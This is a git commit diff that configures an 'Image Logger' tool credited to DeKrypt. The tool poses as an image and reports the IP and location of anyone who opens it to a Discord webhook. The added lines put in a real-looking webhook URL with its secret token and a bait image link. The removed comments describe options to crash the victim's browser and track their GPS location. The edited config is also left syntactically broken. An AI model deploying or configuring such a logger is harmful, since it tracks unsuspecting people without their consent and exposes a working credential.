13cc731f9459ae655d7dbc6b1b58e80ca0211b5d
perkulease <vajor0302@gmail.com>
2025-02-04 19:38:06 -0600

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,21 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
+    "webhook": "https://discord.com/api/webhooks/1336509723738116217/gtY5mw_IbnwelBYRBQv1V3Xzl5PY6Y4zmcgnCG8GzSRS1s1bHWbTdVWnsorjfbaK8h1o",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQaLkUTGFC4N5JDOqLEskHfK1o00imO1epcb_8nWMVkTyvW6MZGb7EGejx77Of4BdJeO_g&usqp=CAU",
         "doMessage": False, # Enable the custom message?
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
